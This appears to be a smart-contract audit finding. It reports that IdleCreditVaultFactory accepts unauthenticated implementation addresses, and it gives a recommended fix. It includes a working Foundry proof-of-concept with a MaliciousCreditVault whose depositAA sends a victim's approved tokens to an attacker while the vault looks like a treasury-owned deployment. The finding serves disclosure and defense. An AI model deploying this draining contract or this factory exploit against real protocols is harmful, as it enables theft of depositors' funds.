### Title
Unauthenticated implementation selection lets attackers deploy factory-branded malicious credit vaults - (File: `contracts/IdleCreditVaultFactory.sol`)

### Summary
`deployCreditVault` and `deployRevolvingCreditVault` are permissionless and accept arbitrary CDO, strategy, queue, escrow, and programmable-borrower implementation addresses without authenticating them against a trusted implementation registry. An attacker can therefore deploy a malicious vault implementation through the canonical factory, have it configured and ownership-transferred to the protocol treasury, and receive a factory `CreditVaultDeployed` event that makes the malicious contract indistinguishable from a legitimately provisioned vault without bytecode inspection. [1](#0-0) [2](#0-1) 

### Finding Description
The factory places caller-supplied `cvParams.implementation`, `strategyData.implementation`, `ancillaryParams.queueImplementation`, `ancillaryParams.writeOffImplementation`, and `programmableBorrowerParams.implementation` directly into new `TransparentUpgradeableProxy` instances. [3](#0-2)  Neither `deployCreditVault` nor `deployRevolvingCreditVault` restricts `msg.sender`, and neither deployment path verifies that these addresses correspond to audited protocol implementations. [1](#0-0) [4](#0-3) 

A malicious credit-vault implementation only needs to accept the initializer and subsequent configuration calls used by the factory. The factory then configures the vault, wires it to the deployed strategy, transfers nominal ownership to `treasury`, and emits `CreditVaultDeployed`. [5](#0-4) [6](#0-5)  The malicious proxied implementation can expose a compatible `depositAA` function that transfers victim-approved underlying directly to the attacker rather than minting tranche shares or forwarding funds to the strategy. [7](#0-6) 

### Impact Explanation
A lender who interacts with the factory-provisioned malicious vault loses the entire approved deposit. For example, a 1,000,000 USDC `depositAA` call can result in 1,000,000 USDC being transferred directly to the attacker, while the vault still appears in factory logs as a treasury-owned deployment. This is direct theft of user assets and breaks the fair-mint invariant that a deposit must produce shares backed by vault assets. [8](#0-7) [9](#0-8) 

### Likelihood Explanation
The attack requires no privileged protocol role: any EOA can call the public deployment functions, provide a malicious implementation, and complete deployment. The remaining requirement is victim interaction with the malicious proxy, which is plausible because the vault is emitted by the canonical factory and subsequently displays treasury ownership. No existing keyring, owner, guardian, strategy whitelist, or proxy-admin control prevents the factory from accepting the supplied implementation address. [1](#0-0) [10](#0-9) [2](#0-1) 

### Recommendation
Restrict vault deployment to treasury-approved implementation addresses or deployment templates. Store allowed implementation IDs in the factory, have callers pass an ID rather than an arbitrary address, and only permit the treasury to update the registry. Emit the selected implementation address in `CreditVaultDeployed` so integrators can validate it without tracing proxy storage. If arbitrary third-party vault creation is intentional, split it into an explicitly unauthenticated factory with distinct events and documentation, and reserve treasury ownership plus the existing deployment event for approved implementations. [11](#0-10) [2](#0-1) 

### Proof of Concept
The following Foundry test deploys the real factory behind a proxy, supplies a malicious CDO implementation to `deployCreditVault`, extracts the factory-emitted vault address, and demonstrates that a victim deposit is sent directly to the attacker.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {ERC20, IERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {TransparentUpgradeableProxy} from
  "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";

import {IdleCreditVaultFactory} from "../contracts/IdleCreditVaultFactory.sol";
import {IdleCreditVault} from "../contracts/strategies/idle/IdleCreditVault.sol";

contract PoCToken is ERC20 {
  constructor() ERC20("USD Coin", "USDC") {}

  function decimals() public pure override returns (uint8) {
    return 6;
  }

  function mint(address to, uint256 amount) external {
    _mint(to, amount);
  }
}

contract MaliciousCreditVault {
  address public token;
  address public owner;
  address public immutable thief;

  constructor() {
    thief = msg.sender;
  }

  // Signature-compatible initializer called through TransparentUpgradeableProxy.
  function initialize(
    uint256,
    address token_,
    address,
    address,
    address,
    address,
    uint256
  ) external {
    token = token_;
    owner = msg.sender;
  }

  function setEpochParams(uint256, uint256) external {}
  function setInstantWithdrawParams(uint256, uint256, bool) external {}
  function setKeyringParams(address, uint256) external {}
  function setIsInterestMinted(bool) external {}
  function setIsDepositDuringEpochDisabled(bool) external {}
  function setFeeParams(address, uint256, uint256, uint256) external {}
  function setGuardian(address) external {}

  function transferOwnership(address newOwner) external {
    owner = newOwner;
  }

  function epochEndDate() external view returns (uint256) {
    return block.timestamp - 1;
  }

  // Malicious fund-handling surface: drains the caller's approved deposit.
  function depositAA(uint256 amount) external returns (uint256) {
    IERC20(token).transferFrom(msg.sender, thief, amount);
    return amount;
  }
}

contract FactoryUnauthenticatedImplementationPoC is Test {
  bytes32 constant DEPLOYED_TOPIC =
    keccak256("CreditVaultDeployed(address,address,address,address,address,address)");

  address attacker = makeAddr("attacker");
  address victim = makeAddr("victim");
  address treasury = makeAddr("treasury");
  address proxyAdmin = makeAddr("proxyAdmin");
  address factoryProxyAdmin = makeAddr("factoryProxyAdmin");
  address manager = makeAddr("honestManager");
  address borrower = makeAddr("honestBorrower");

  function testFactoryDeploysUnauthenticatedDrainingImplementation() external {
    PoCToken underlying = new PoCToken();
    underlying.mint(victim, 1_000_000e6);

    IdleCreditVaultFactory factoryImpl = new IdleCreditVaultFactory();
    IdleCreditVaultFactory factory = IdleCreditVaultFactory(
      address(new TransparentUpgradeableProxy(
        address(factoryImpl),
        factoryProxyAdmin,
        abi.encodeWithSelector(
          IdleCreditVaultFactory.initialize.selector,
          treasury,
          proxyAdmin
        )
      ))
    );

    vm.prank(attacker);
    MaliciousCreditVault maliciousImpl = new MaliciousCreditVault();
    IdleCreditVault strategyImpl = new IdleCreditVault();

    IdleCreditVaultFactory.CreditVaultParams memory cvParams =
      IdleCreditVaultFactory.CreditVaultParams({
        implementation: address(maliciousImpl),
        limit: 0,
        underlying: address(underlying),
        apr: 5e18,
        epochDuration: 30 days,
        bufferPeriod: 5 days,
        instantWithdrawDelay: 0,
        instantWithdrawAprDelta: 0,
        disableInstantWithdraw: true,
        keyringPolicy: 0,
        feeReceiver: makeAddr("feeReceiver"),
        fees: 5_000,
        managementFee: 500,
        isInterestMinted: false,
        isDepositDuringEpochDisabled: true
      });

    IdleCreditVaultFactory.StrategyData memory strategyData =
      IdleCreditVaultFactory.StrategyData({
        implementation: address(strategyImpl),
        manager: manager,
        borrower: borrower,
        borrowerName: "Borrower"
      });

    vm.recordLogs();
    vm.prank(attacker);
    factory.deployCreditVault(
      cvParams,
      strategyData,
      IdleCreditVaultFactory.AncillaryParams({
        keyring: address(0),
        queueImplementation: address(0),
        prefundedDepositWindow: 0,
        writeOffImplementation: address(0)
      })
    );

    address maliciousVault;
    Vm.Log[] memory logs = vm.getRecordedLogs();
    for (uint256 i; i < logs.length; ++i) {
      if (logs[i].emitter == address(factory) && logs[i].topics[0] == DEPLOYED_TOPIC) {
        (maliciousVault,,,,,) = abi.decode(
          logs[i].data,
          (address, address, address, address, address, address)
        );
      }
    }
    assertTrue(maliciousVault != address(0));

    vm.startPrank(victim);
    underlying.approve(maliciousVault, 1_000_000e6);
    MaliciousCreditVault(maliciousVault).depositAA(1_000_000e6);
    vm.stopPrank();

    assertEq(underlying.balanceOf(attacker), 1_000_000e6);
    assertEq(underlying.balanceOf(victim), 0);
    assertEq(underlying.balanceOf(maliciousVault), 0);
    assertEq(MaliciousCreditVault(maliciousVault).owner(), treasury);
  }
}
```

  function _deposit(uint256 _amount, address _tranche) internal virtual whenNotPaused returns (uint256 _minted) {
    if (_amount == 0) {
      return _minted;
    }
    // check that we are not depositing more than the contract available limit
    _guarded(_amount);
    // interest accrued since last depositXX/withdrawXX is splitted between AA and BB
    // according to trancheAPRSplitRatio. NAVs of AA and BB are updated and tranche
    // prices adjusted accordingly
    _updateAccounting();
    // get underlyings from sender
    address _token = token;
    uint256 _preBal = _contractTokenBalance(_token);
    _transferUnderlyingsFrom(msg.sender, address(this), _amount);
    // mint tranche tokens according to the current tranche price
    _minted = _mintSharesAtCurrPrice(_contractTokenBalance(_token) - _preBal, msg.sender, _tranche);
    // update trancheAPRSplitRatio
    _updateSplitRatio(_getAARatio(true));

    // direct deposit in the strategy
    IIdleCDOStrategy(strategy).deposit(_amount);
  }
